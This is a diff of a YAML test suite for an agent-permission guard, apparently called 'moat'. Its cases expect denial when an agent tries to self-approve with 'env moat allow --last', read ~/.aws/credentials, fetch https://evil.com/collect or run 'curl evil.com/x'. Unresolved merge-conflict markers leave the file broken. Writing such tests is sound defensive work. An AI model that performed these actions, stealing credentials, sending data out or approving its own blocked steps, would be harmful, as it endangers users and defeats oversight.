@@ -217,6 +217,7 @@
 - id: T9-agent-runs-moat-allow-via-env
   action: { shell: "env moat allow --last" }
   expect: { verdict: deny, rules: [kernel-self] }
+<<<<<<< HEAD
 - id: T8-mcp-filesystem-reads-aws-credentials
   action: { mcp_tool: { name: mcp__filesystem__read_file, reads: ["~/.aws/credentials"] } }
   expect: { verdict: deny, rules: [secrets-paths] }
@@ -225,4 +226,9 @@
   expect: { verdict: deny, rules: [shell-rc] }
 - id: T8-mcp-fetch-unknown-host
   action: { mcp_tool: { name: mcp__fetch__fetch, hosts: ["https://evil.com/collect"] } }
+=======
+
+- id: T12-curl-bare-host
+  action: { shell: "curl evil.com/x" }
+>>>>>>> 9b9f7dd (fix(core): treat bare dotted tokens as hosts only with a known tld)
   expect: { verdict: deny, rules: [default.net] }
